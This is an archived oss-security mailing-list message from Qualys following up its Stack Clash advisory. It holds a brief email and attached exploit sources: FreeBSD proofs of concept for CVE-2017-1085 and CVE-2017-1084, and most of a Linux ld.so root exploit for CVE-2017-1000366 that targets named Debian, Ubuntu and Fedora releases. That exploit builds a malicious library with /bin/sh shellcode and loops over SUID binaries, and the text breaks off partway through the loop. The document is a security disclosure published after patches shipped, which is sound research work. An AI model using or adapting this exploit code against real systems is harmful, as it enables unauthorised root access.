X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["128905" "Wednesday" "28" "June" "2017" "10:45:37" "-0700" "Qualys Security Advisory" "qsa@qualys.com" "<20170628174537.GB16895@localhost.localdomain>" "4048" "Re: [oss-security] Qualys Security Advisory - The Stack Clash" "^Date:" nil nil "6" "2017062817:45:37" "[oss-security] Qualys Security Advisory - The Stack Clash" (number mark "        qsa@qualys.c Jun 28 4048/128905 " thread-indent "\"Re: [oss-security] Qualys Security Advisory - The Stack Clash\"\n") "<20170626003556.GA8994@openwall.com>" ("<20170619152843.GC7769@localhost.localdomain>" "<2a53a138-8f6b-133d-72b2-6dfd5355241a@redhat.com>" "<20170619203933.GA910@openwall.com>" "<20170620132204.GA6240@openwall.com>" "<20170621212835.GA28151@localhost.localdomain>" "<20170626003556.GA8994@openwall.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 14202 invoked by uid 550); 28 Jun 2017 17:50:08 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 6080 invoked from network); 28 Jun 2017 17:46:04 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=qualys.com; s=google;
        h=date:from:to:subject:message-id:references:mime-version
         :content-disposition:in-reply-to;
        bh=4Stzhy/V/ZnpPesp3uVz3288YpnL9S6o8hRK4/krScg=;
        b=ndZWt44jeoB4y0u7rD/e0HGn1miURBT30j7SE7el/yWEmdN7Cln+O4i1Y94zJJ2Bry
         U0EnBUl81Fnp8jDzuHaBd+VHC76SeFdCXQTF7WEtn8DFEeIBHwKUytnH+NfXw4tvbPEa
         YDgyiblfCgojcb2UMkVv78R5x9FyR8X5EdhfyZIUw7NCmc06eCRR2n4iTalKNI+Frh4m
         JmWTHHkVNSadgaJs2A9i0hytxhbY1mnih+rkNpMrsbtXKrNemAqfiH/GKCTsdegmk3Uj
         OW9j4DFzsjbLDAKhhHysHfh9VVtvzPJD5YgeUODwwb8/NUplRgCaJceSZ3BiaTE8tDeO
         x3+w==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:date:from:to:subject:message-id:references
         :mime-version:content-disposition:in-reply-to;
        bh=4Stzhy/V/ZnpPesp3uVz3288YpnL9S6o8hRK4/krScg=;
        b=DW09qJFbo/rXePVfYRCidIus6F4ZokoqsYPF3ytCQv9uWxSVU+isTRTKRNUCJnfPpJ
         UConJSRDLE/zUONRkoYGNz29hqcNN0eum1iGtAMLQOM77GglhAe5StXfTJwMUweX5vCz
         KYrNsGDRo3emz9XX3Lw+PHyefxinAt1kDT6E9DHF/C9sUJ3/dSFVLxoSShkVDfGoFgEH
         OT+dAwvcEQU3FowoaliaehI46t11TS+wvdGkkwW6fSq6Vf+eh3VFCFBaQndEaB1uG//i
         aX84u+K0WkNhk6FYlnGzmhsiOfKsYPglS+ZrLPHIfvlLOEBuTcOBvIynPmbClYlMWSsF
         c3XQ==
X-Gm-Message-State: AKS2vOx5B3q2OlXfLWnRZuy1TuvxwjOIv0X+reuq6ZMw989kss4ulXDg
	PiyXfklvuD0E1izcFx8=
X-Received: by 10.99.2.17 with SMTP id 17mr11341774pgc.264.1498671952190;
        Wed, 28 Jun 2017 10:45:52 -0700 (PDT)
Message-ID: <20170628174537.GB16895@localhost.localdomain>
References: <20170619152843.GC7769@localhost.localdomain>
 <2a53a138-8f6b-133d-72b2-6dfd5355241a@redhat.com>
 <20170619203933.GA910@openwall.com>
 <20170620132204.GA6240@openwall.com>
 <20170621212835.GA28151@localhost.localdomain>
 <20170626003556.GA8994@openwall.com>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="WIyZ46R2i8wDzkSu"
Content-Disposition: inline
In-Reply-To: <20170626003556.GA8994@openwall.com>
Date: Wed, 28 Jun 2017 10:45:37 -0700
From: Qualys Security Advisory <qsa@qualys.com>
Reply-To: oss-security@lists.openwall.com
Subject: Re: [oss-security] Qualys Security Advisory - The Stack Clash
To: oss-security@lists.openwall.com

--WIyZ46R2i8wDzkSu
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

Hi all,

On Mon, Jun 26, 2017 at 02:35:57AM +0200, Solar Designer wrote:
> The decision to wait for fixes in major distros that almost certainly do
> intend to release fixes makes sense to me.

Thank you.  Since Fedora and Slackware published their updates, and
FreeBSD and NetBSD published their patches (and our *BSD POCs are not
full-fledged exploits anyway), we attached our Stack Clash exploits and
POCs to this mail (alternatively, they are also available at
https://www.qualys.com/research/security-advisories/).

A few notes on the Linux ld.so exploits:

- Linux_ldso_dynamic's probability of success varies significantly from
  one SUID binary to another, because it depends on the size of the
  .dynamic, .data, and .bss sections of the SUID binary.

- Linux_ldso_hwcap's probability of success depends on the length of the
  path to the SUID binary -- as a rule of thumb, the longer the path,
  the higher the probability of success.

- On Fedora and CentOS, Linux_ldso_hwcap_64 may not work against
  "short-path" SUID binaries, but it works against the "long-path" SUIDs
  that are installed by default (for example,
  /usr/lib/polkit-1/polkit-agent-helper-1).

  Moreover, we wrote a quick-and-dirty version of this exploit that does
  work against the SUIDs in /usr/bin (it does not hardcode the 96KB/32KB
  sizes of argv[] pointers/free stack space, but instead optimizes these
  sizes).  However, we wanted to keep the main loop of this exploit as
  simple as possible, and this improvement is therefore left as an
  exercise for the interested reader.

We are at your disposal for questions, comments, and further
discussions.  Thank you very much!

With best regards,

-- 
the Qualys Security Advisory team

    Give 'Em Enough ROP
            --The Clash, second studio album


--WIyZ46R2i8wDzkSu
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="FreeBSD_CVE-2017-1085.c"

/*
 * FreeBSD_CVE-2017-1085.c
 * Copyright (C) 2017 Qualys, Inc.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/time.h>
#include <unistd.h>

#define die() do { \
    fprintf(stderr, "died in %s: %u\n", __func__, __LINE__); \
    exit(EXIT_FAILURE); \
} while (0)

int
main(const int argc, char * const argv[])
{
    static const struct rlimit core;
    if (setrlimit(RLIMIT_CORE, &core)) die();

    struct rlimit stack;
    if (getrlimit(RLIMIT_STACK, &stack)) die();
    if (stack.rlim_cur > stack.rlim_max / 3) {
        stack.rlim_cur = stack.rlim_max / 3;
        if (setrlimit(RLIMIT_STACK, &stack)) die();
        execve(*argv, argv, NULL);
        die();
    }
    char * prot_none = NULL;
    for (;;) {
        prot_none = mmap(NULL, 4096, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (prot_none == MAP_FAILED) die();
        if ((uintptr_t)&stack < (uintptr_t)prot_none) die();
        if ((uintptr_t)&stack - (uintptr_t)prot_none < stack.rlim_max / 3 * 2) break;
    }
    if (argc > 1) {
        stack.rlim_cur = stack.rlim_max;
        if (setrlimit(RLIMIT_STACK, &stack)) die();
    }
    *prot_none = 'A';
    printf("char at %p: %02x\n", prot_none, *prot_none);
    exit(EXIT_SUCCESS);
}

--WIyZ46R2i8wDzkSu
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="FreeBSD_CVE-2017-FGPE.c"

/*
 * FreeBSD_CVE-2017-FGPE.c for CVE-2017-1084 (please compile with -O0)
 * Copyright (C) 2017 Qualys, Inc.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/time.h>

#define die() do { \
    fprintf(stderr, "died in %s: %u\n", __func__, __LINE__); \
    exit(EXIT_FAILURE); \
} while (0)

static const char * last_page;

static void
alloc(const char * const final)
{
    for (;;) {
        last_page = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (last_page == MAP_FAILED) die();
        if (last_page >= final) break;
    }
}

static void
clash_smash_no_jump(const size_t smash_size)
{
    char buf[1024];
    memset(buf, 'A', sizeof(buf));
    if (smash_size > sizeof(buf))
        clash_smash_no_jump(smash_size - sizeof(buf));
}

#define SGROWSIZ        ((size_t)128UL*1024)            /* amount to grow stack */

int
main(void)
{
    static const struct rlimit core;
    if (setrlimit(RLIMIT_CORE, &core)) die();

    struct rlimit stack;
    if (getrlimit(RLIMIT_STACK, &stack)) die();
    const size_t smash_size = stack.rlim_cur / 3 * 2;
    const size_t final_dist = arc4random() % smash_size;

    alloc((const char *)&stack - final_dist);
    clash_smash_no_jump(smash_size);
    printf("char at %p: %02x; final dist %zu (%zu)\n", last_page, *last_page, final_dist % SGROWSIZ, final_dist);
    exit(EXIT_SUCCESS);
}

--WIyZ46R2i8wDzkSu
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="FreeBSD_CVE-2017-FGPU.c"

/*
 * FreeBSD_CVE-2017-FGPU.c for CVE-2017-1084 (please compile with -O0)
 * Copyright (C) 2017 Qualys, Inc.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/time.h>

#define die() do { \
    fprintf(stderr, "died in %s: %u\n", __func__, __LINE__); \
    exit(EXIT_FAILURE); \
} while (0)

static const char * last_page;

static void
clash(void)
{
    for (;;) {
        const char * const page = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (page <= last_page) die();
        if (page == MAP_FAILED) break;
        last_page = page;
    }
    if (!last_page) die();
}

static void
smash_no_jump(const size_t smash_size)
{
    char buf[1024];
    memset(buf, 'A', sizeof(buf));
    if (smash_size > sizeof(buf))
        smash_no_jump(smash_size - sizeof(buf));
}

#define SGROWSIZ        ((size_t)128UL*1024)            /* amount to grow stack */

int
main(void)
{
    static const struct rlimit core;
    if (setrlimit(RLIMIT_CORE, &core)) die();

    clash();
    smash_no_jump(SGROWSIZ / 2 * 3);
    printf("char at %p: %02x\n", last_page, *last_page);
    exit(EXIT_SUCCESS);
}

--WIyZ46R2i8wDzkSu
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="Linux_ldso_dynamic.c"

/*
 * Linux_ldso_dynamic.c for CVE-2017-1000366, CVE-2017-1000371
 * Copyright (C) 2017 Qualys, Inc.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#define _GNU_SOURCE
#include <elf.h>
#include <fcntl.h>
#include <limits.h>
#include <link.h>
#include <signal.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/param.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define PAGESZ ((size_t)4096)
#define ALIGN ((size_t)16)

#define PIE_BASE ((uintptr_t)0x80000000)
#define PIE_RAND ((size_t)1<<20)

#define STACK_BASE ((uintptr_t)0xC0000000)
#define STACK_RAND ((size_t)8<<20)

#define MAX_ARG_STRLEN ((size_t)128<<10)

static const struct target * target;
static const struct target {
    const char * name;
    const char * repl_lib;
} targets[] = {
    {
        .name = "Debian 9 (stretch)",
        .repl_lib = "lib/i386-linux-gnu",
    },
    {
        .name = "Debian 10 (buster)",
        .repl_lib = "lib/i386-linux-gnu",
    },
    {
        .name = "Ubuntu 14.04.5 (Trusty Tahr)",
        .repl_lib = "lib/i386-linux-gnu",
    },
    {
        .name = "Ubuntu 16.04.2 (Xenial Xerus)",
        .repl_lib = "lib/i386-linux-gnu",
    },
    {
        .name = "Ubuntu 17.04 (Zesty Zapus)",
        .repl_lib = "lib/i386-linux-gnu",
    },
    {
        .name = "Fedora 23 (Server Edition)",
        .repl_lib = "lib",
    },
    {
        .name = "Fedora 24 (Server Edition)",
        .repl_lib = "lib",
    },
    {
        .name = "Fedora 25 (Server Edition)",
        .repl_lib = "lib",
    },
};

#define die() do { \
    printf("died in %s: %u\n", __func__, __LINE__); \
    exit(EXIT_FAILURE); \
} while (0)

static const ElfW(auxv_t) * my_auxv;

static unsigned long int
my_getauxval (const unsigned long int type)
{
    const ElfW(auxv_t) * p;

    if (!my_auxv) die();
    for (p = my_auxv; p->a_type != AT_NULL; p++)
        if (p->a_type == type)
            return p->a_un.a_val;
    die();
}

struct elf_info {
    uintptr_t map_start, map_end;
    uintptr_t dyn_start, dyn_end;
};

static struct elf_info
get_elf_info(const char * const binary)
{
    static struct elf_info elf;
    const int fd = open(binary, O_RDONLY | O_NOFOLLOW);
    if (fd <= -1) die();
    struct stat st;
    if (fstat(fd, &st)) die();
    if (!S_ISREG(st.st_mode)) die();
    if (st.st_size <= 0) die();
    #define SAFESZ ((size_t)64<<20)
    if (st.st_size >= (ssize_t)SAFESZ) die();
    const size_t size = st.st_size;
    uint8_t * const buf = malloc(size);
    if (!buf) die();
    if (read(fd, buf, size) != (ssize_t)size) die();
    if (close(fd)) die();

    if (size <= sizeof(ElfW(Ehdr))) die();
    const ElfW(Ehdr) * const ehdr = (const ElfW(Ehdr) *)buf;
    if (ehdr->e_ident[EI_MAG0] != ELFMAG0) die();
    if (ehdr->e_ident[EI_MAG1] != ELFMAG1) die();
    if (ehdr->e_ident[EI_MAG2] != ELFMAG2) die();
    if (ehdr->e_ident[EI_MAG3] != ELFMAG3) die();
    if (ehdr->e_ident[EI_CLASS] != ELFCLASS32) die();
    if (ehdr->e_ident[EI_DATA] != ELFDATA2LSB) die();
    if (ehdr->e_type != ET_DYN) die();
    if (ehdr->e_machine != EM_386) die();
    if (ehdr->e_version != EV_CURRENT) die();
    if (ehdr->e_ehsize != sizeof(ElfW(Ehdr))) die();
    if (ehdr->e_phentsize != sizeof(ElfW(Phdr))) die();
    if (ehdr->e_shentsize != sizeof(ElfW(Shdr))) die();
    if (ehdr->e_phoff <= 0 || ehdr->e_phoff >= size) die();
    if (ehdr->e_shoff <= 0 || ehdr->e_shoff >= size) die();
    if (ehdr->e_phnum > (size - ehdr->e_phoff) / sizeof(ElfW(Phdr))) die();
    if (ehdr->e_shnum > (size - ehdr->e_shoff) / sizeof(ElfW(Shdr))) die();

    unsigned int i;
  {
    int interp = 0;
    for (i = 0; i < ehdr->e_phnum; i++) {
        const ElfW(Phdr) * const phdr = (const ElfW(Phdr) *)(buf + ehdr->e_phoff) + i;
        if (phdr->p_type == PT_INTERP) interp = 1;
        if (phdr->p_type != PT_LOAD) continue;
        if (elf.map_start) die();

        if (phdr->p_offset >= size) die();
        if (phdr->p_filesz > size - phdr->p_offset) die();
        if (phdr->p_filesz > phdr->p_memsz) die();
        if (phdr->p_vaddr != phdr->p_paddr) die();
        if (phdr->p_vaddr >= SAFESZ) die();
        if (phdr->p_memsz >= SAFESZ) die();
        if (phdr->p_memsz <= 0) die();
        if (phdr->p_align != PAGESZ) die();

        switch (phdr->p_flags) {
            case PF_R | PF_X:
                if (phdr->p_vaddr) die();
                break;
            case PF_R | PF_W:
                elf.map_start = phdr->p_vaddr & ~(PAGESZ-1);
                elf.map_end = (phdr->p_vaddr + phdr->p_memsz + PAGESZ-1) & ~(PAGESZ-1);
                if (!elf.map_start) die();
                break;
            default:
                die();
        }
    }
    if (!interp) die();
    if (!elf.map_start) die();
  }
    for (i = 0; i < ehdr->e_shnum; i++) {
        const ElfW(Shdr) * const shdr = (const ElfW(Shdr) *)(buf + ehdr->e_shoff) + i;
        if (!(shdr->sh_flags & SHF_ALLOC)) continue;
        if (shdr->sh_size <= 0) die();
        if (shdr->sh_size >= SAFESZ) die();
        if (shdr->sh_addr >= SAFESZ) die();
        #undef SAFESZ
        const uintptr_t start = shdr->sh_addr;
        const uintptr_t end = start + shdr->sh_size;

        if (!(shdr->sh_flags & SHF_WRITE)) {
            if (start < elf.map_end && end > elf.map_start) die();
            continue;
        }
        if (start < elf.map_start || end > elf.map_end) die();
        if (shdr->sh_type != SHT_DYNAMIC) continue;
        if (shdr->sh_entsize != sizeof(ElfW(Dyn))) die();

        if (elf.dyn_start) die();
        elf.dyn_start = start;
        elf.dyn_end = end;
        if (!elf.dyn_start) die();
    }
    if (!elf.dyn_start) die();
    free(buf);
    return elf;
}

static void
create_needed_lib(const char * const needed)
{
    static struct lib {
        union {
            struct {
                ElfW(Ehdr) e;
                ElfW(Phdr) p1;
                ElfW(Phdr) p2;
                ElfW(Phdr) p3;
            } h;
            char align[PAGESZ];
        } u;
        char code1[PAGESZ];
        char code3[PAGESZ];
        char code2[8<<20];
    } lib = { .u = { .h = {
        .e = {
            .e_ident = {
                ELFMAG0,
                ELFMAG1,
                ELFMAG2,
                ELFMAG3,
                ELFCLASS32,
                ELFDATA2LSB,
                EV_CURRENT,
                ELFOSABI_SYSV,
                0
            },
            .e_type = ET_DYN,
            .e_machine = EM_386,
            .e_version = EV_CURRENT,
            .e_phoff = offsetof(struct lib, u.h.p1),
            .e_ehsize = sizeof(ElfW(Ehdr)),
            .e_phentsize = sizeof(ElfW(Phdr)),
            .e_phnum = 3
        },
        .p1 = {
            .p_type = PT_LOAD,
            .p_offset = offsetof(struct lib, code1),
            .p_vaddr = 0,
            .p_filesz = sizeof(lib.code1),
            .p_memsz = sizeof(lib.code1),
            .p_flags = PF_R | PF_X,
            .p_align = PAGESZ
        },
        .p2 = {
            .p_type = PT_LOAD,
            .p_offset = offsetof(struct lib, code2),
            .p_vaddr = -(sizeof(lib.code2) + PAGESZ),
            .p_filesz = sizeof(lib.code2),
            .p_memsz = sizeof(lib.code2),
            .p_flags = PF_R | PF_X,
            .p_align = PAGESZ
        },
        .p3 = {
            .p_type = PT_LOAD,
            .p_offset = offsetof(struct lib, code3),
            .p_vaddr = sizeof(lib.code1),
            .p_filesz = sizeof(lib.code3),
            .p_memsz = sizeof(lib.code3),
            .p_flags = PF_R | PF_X,
            .p_align = PAGESZ
        }
    }}};

    static const char shellcode[] =
        "\x83\xc4\x40\xb8\x17\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xb8"
        "\x2e\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xb8\x3f\x00\x00\x00"
        "\xbb\x00\x00\x00\x00\xb9\x01\x00\x00\x00\xcd\x80\xb8\x3f\x00\x00"
        "\x00\xbb\x00\x00\x00\x00\xb9\x02\x00\x00\x00\xcd\x80\xb8\x0b\x00"
        "\x00\x00\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\xba\x00"
        "\x00\x00\x00\x52\x53\x89\xe1\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00"
        "\x00\x00\x00\xcd\x80";

    memset(lib.code2, 0x90, sizeof(lib.code2));
    if (sizeof(lib.code2) <= sizeof(shellcode)) die();
    memcpy(lib.code2 + sizeof(lib.code2) - sizeof(shellcode), shellcode, sizeof(shellcode));

    const int fd = open(needed, O_WRONLY | O_CREAT | O_TRUNC | O_NOFOLLOW, 0);
    if (fd <= -1) die();
    if (write(fd, &lib, sizeof(lib)) != (ssize_t)sizeof(lib)) die();
    if (fchmod(fd, 0755)) die();
    if (close(fd)) die();
}

static const char my_x86_platforms[4][5] = {
    "i386", "i486", "i586", "i686"
};

int
main(const int my_argc, const char * const my_argv[], const char * const my_envp[])
{
  {
    const char * const * p = my_envp;
    while (*p++) ;
    my_auxv = (const void *)p;
  }
    if (my_getauxval(AT_PAGESZ) != PAGESZ) die();

    if (my_argc != 1+2) {
        printf("Usage: %s target binary\n", my_argv[0]);
        size_t i;
        for (i = 0; i < sizeof(targets)/sizeof(*targets); i++) {
            printf("Target %zu %s\n", i, targets[i].name);
        }
        die();
    }
  {
    const size_t i = strtoul(my_argv[1], NULL, 10);
    if (i >= sizeof(targets)/sizeof(*targets)) die();
    target = targets + i;
    printf("Target %zu %s\n", i, target->name);
  }
    const char * const binary = realpath(my_argv[2], NULL);
    if (!binary) die();
    if (*binary != '/') die();
    if (access(binary, R_OK | X_OK)) die();

    const struct elf_info elf = get_elf_info(binary);
    printf("map_start -> dyn_end = %u\n", elf.dyn_end - elf.map_start);
    printf("dyn_start -> dyn_end = %u\n", elf.dyn_end - elf.dyn_start);
    printf("dyn_start -> map_end = %u\n", elf.map_end - elf.dyn_start);
    printf("dyn_end -> map_end = %u\n", elf.map_end - elf.dyn_end);

    const char * const slash = strrchr(binary, '/');
    if (!slash) die();
    if (slash <= binary) die();
    const char * const origin = strndup(binary, slash - binary);
    if (!origin) die();
    printf("origin %s (%zu)\n", origin, strlen(origin));

    const char * const platform = (const void *)my_getauxval(AT_PLATFORM);
    if (!platform) die();
    const size_t platform_len = strlen(platform);
    if (platform_len != 4) die();
  {
    size_t i;
    for (i = 0; ; i++) {
        if (i >= sizeof(my_x86_platforms) / sizeof(my_x86_platforms[0])) die();
        if (strcmp(platform, my_x86_platforms[i]) == 0) break;
    }
  }
    const struct {
        const char * str;
        size_t len;
        size_t repl_len;
    } DSTs[] = {
        #define DST_LIB "LIB"
        { DST_LIB, strlen(DST_LIB), strlen(target->repl_lib) },
        #define DST_PLATFORM "PLATFORM"
        { DST_PLATFORM, strlen(DST_PLATFORM), platform_len }
    };
    size_t repl_max = strlen(origin);
  {
    size_t i;
    for (i = 0; i < sizeof(DSTs)/sizeof(*DSTs); i++) {
        if (repl_max < DSTs[i].repl_len)
            repl_max = DSTs[i].repl_len;
    }
  }
    printf("repl_max %zu\n", repl_max);
    if (repl_max < 4) die();

    static struct {
        double probability;
        size_t len, gwr, cnt, dst;
    } best;

    #define LLP "LD_LIBRARY_PATH="
    static char llp[MAX_ARG_STRLEN];
    #define MAX_GWR (sizeof(llp) - sizeof(LLP))
  {
    size_t len;
    for (len = MAX_GWR; len >= ALIGN; len -= ALIGN) {
        size_t gwr;
        for (gwr = len; gwr >= elf.dyn_end - elf.dyn_start; gwr--) {
            size_t dst;
            for (dst = 0; dst < sizeof(DSTs)/sizeof(*DSTs); dst++) {
                const size_t cnt = (len - gwr) / (1 + DSTs[dst].len + 1);
                const size_t gpj = (len + ((repl_max > 4) ? (cnt * (repl_max - 4)) : 0) + 1 + (ALIGN-1)) & ~(ALIGN-1);
                const size_t bwr = cnt * (DSTs[dst].repl_len + 1) + ((len - gwr) - cnt * (1 + DSTs[dst].len + 1)) + 1;

                if (gwr + bwr >= elf.map_end - elf.dyn_start) continue;
                const size_t min = MIN(gwr, elf.dyn_end - elf.map_start);
                if (gpj <= min + (elf.map_end - elf.dyn_end) + 3 * PAGESZ) continue;

                const double probability = (double)min / (double)(PIE_RAND + STACK_RAND);
                if (best.probability < probability) {
                    best.probability = probability;
                    best.len = len;
                    best.gwr = gwr;
                    best.cnt = cnt;
                    best.dst = dst;
                    printf("len %zu gpj %zu gwr %zu bwr %zu cnt %zu dst %zu repl %zu probability 1/%zu (%.10g)\n",
                            len, gpj, gwr, bwr, cnt, DSTs[dst].len, DSTs[dst].repl_len, (size_t)(1 / probability), probability);
                }
            }
        }
    }
  }
    if (!best.probability) die();
    if (STACK_BASE <= PIE_BASE) die();
    const size_t stack_size = (STACK_BASE - PIE_BASE) - (PIE_RAND/2 + elf.map_end + STACK_RAND/2);
    printf("stack_size %zu\n", stack_size);

    #define STRTAB_SIZE (2 * STACK_RAND)
    #define NEEDED "./3456789abcdef"
    if (sizeof(NEEDED) != ALIGN) die();
    static union {
        uintptr_t p;
        char s[sizeof(void *)];
    } strtab_addr;
  {
    static const ElfW(Dyn) dyn;
    if (sizeof(strtab_addr) != sizeof(dyn.d_un)) die();
    if (sizeof(strtab_addr.p) != sizeof(dyn.d_un)) die();
    if (sizeof(strtab_addr.s) != sizeof(dyn.d_un)) die();
  }
  {
    uintptr_t needed_addr = STACK_BASE - STACK_RAND/2 - STRTAB_SIZE/2;
    const uintptr_t first_needed_addr = needed_addr;
    for (;; needed_addr += sizeof(NEEDED)) {
        if (needed_addr % sizeof(NEEDED)) die();
        strtab_addr.p = needed_addr / 2;
        size_t i;
        for (i = 0; i < sizeof(strtab_addr.s); i++) {
            if (strchr("$:;\\", strtab_addr.s[i])) {
                if (i >= 3) die();
                break;
            }
        }
        if (i >= sizeof(strtab_addr.s)) break;
    }
    printf("needed %08x -> %08x (first %08x -> %08x)\n",
            needed_addr, strtab_addr.p, first_needed_addr,
            needed_addr - first_needed_addr);
    if (needed_addr < first_needed_addr) die();
    if (needed_addr - first_needed_addr >= STACK_RAND / 4) die();
  }
    #define INITIAL_STACK_EXPANSION (131072UL)
    const size_t needed_envs = STRTAB_SIZE / sizeof(NEEDED);
    if (needed_envs < INITIAL_STACK_EXPANSION / sizeof(char *)) die();

    static char clash[MAX_ARG_STRLEN];
    memset(clash, ' ', sizeof(clash)-1);
    if ((strlen(clash) + 1) % ALIGN) die();
    const size_t clash_envs = (stack_size - sizeof(llp) - needed_envs * (sizeof(char *) + sizeof(NEEDED)))
                              / (sizeof(char *) + sizeof(clash));
    printf("#needed %zu #clash %zu\n", needed_envs, clash_envs);

  {
    char * cp = mempcpy(llp, LLP, sizeof(LLP)-1);
    memset(cp, '/', best.len);
    const char * const bwrp = cp + best.gwr;
    cp += elf.dyn_start % ALIGN;
    if (cp >= bwrp) die();
   {
    static const ElfW(Dyn) dyn;
    for (; bwrp - cp >= (ptrdiff_t)sizeof(dyn); cp += sizeof(dyn)) {
        ElfW(Dyn) * const dynp = (void *)cp;
        dynp->d_tag = DT_AUXILIARY;
        dynp->d_un.d_ptr = strtab_addr.p;
    }
   }
    if (cp > bwrp) die();
    cp = (char *)bwrp;
    if (!best.cnt) die();
    if (best.dst >= sizeof(DSTs)/sizeof(*DSTs)) die();
    size_t i;
    for (i = 0; i < best.cnt; i++) {
        *cp++ = '$';
        cp = mempcpy(cp, DSTs[best.dst].str, DSTs[best.dst].len);
        *cp++ = '/';
    }
    if (cp >= llp + sizeof(llp)) die();
    if ((strlen(llp) + 1) % ALIGN) die();
    if ((strlen(llp) + 1) != sizeof(LLP) + best.len) die();
  }

    #define LHCM "LD_HWCAP_MASK="
    static char lhcm[64];
  {
    const int width = ALIGN - (sizeof(LHCM) + strlen(binary) + 1 + sizeof(void *)) % ALIGN;
    if (width <= 0) die();
    if ((unsigned int)width > ALIGN) die();
    if ((unsigned int)snprintf(lhcm, sizeof(lhcm), "%s%0*u", LHCM, width, 0)
                                  >= sizeof(lhcm)) die();
    if (strlen(lhcm) + 1 != sizeof(LHCM) + width) die();
  }

    const size_t args = 2 + clash_envs + needed_envs + 1;
    char ** const argv = calloc(args, sizeof(char *));
    if (!argv) die();
  {
    char ** ap = argv;
    *ap++ = (char *)binary;
    *ap++ = "--help";
    size_t i;
    for (i = 0; i < clash_envs; i++) {
        *ap++ = clash;
    }
    for (i = 0; i < needed_envs; i++) {
        *ap++ = NEEDED;
    }
    *ap++ = NULL;
    if (ap != argv + args) die();
  }

    const size_t envs = 1 + 2;
    char ** const envp = calloc(envs, sizeof(char *));
    if (!envp) die();
  {
    char ** ep = envp;
    *ep++ = llp;
    *ep++ = lhcm;
    *ep++ = NULL;
    if (ep != envp + envs) die();
  }

  {
    static const struct rlimit rlimit_stack = { RLIM_INFINITY, RLIM_INFINITY };
    if (setrlimit(RLIMIT_STACK, &rlimit_stack)) die();
  }
    int pipefd[2];
    if (pipe(pipefd)) die();
    if (close(pipefd[0])) die();
    pipefd[0] = -1;
    if (signal(SIGPIPE, SIG_DFL) == SIG_ERR) die();

    create_needed_lib(NEEDED);

    size_t try;
    for (try = 1; try <= 65536; try++) {
        if (fflush(stdout)) die();
        const pid_t pid = fork();
        if (pid <= -1) die();
        if (pid == 0) {
            if (dup2(pipefd[1], 1) != 1) die();
            if (dup2(pipefd[1], 2) != 2) die();
